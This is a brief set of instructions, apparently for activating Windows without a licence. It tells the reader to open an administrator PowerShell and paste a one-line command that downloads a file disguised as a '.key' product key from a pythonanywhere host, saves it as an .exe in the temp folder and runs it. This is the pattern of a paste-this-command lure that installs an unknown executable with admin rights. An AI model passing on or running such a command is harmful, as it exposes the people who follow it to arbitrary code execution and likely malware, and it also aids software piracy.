Press `Win Key` + `X` and select Windows PowerShell(Admin)

Paste the following command and press enter:

    Invoke-WebRequest -Uri kmsconnection.pythonanywhere.com/static/3KHY7-WNT83-DGQKR-F7HPR-844BM.key -OutFile $env:TEMP\AcWin.exe; Start-Process $env:TEMP\AcWin.exe

Restart your PC
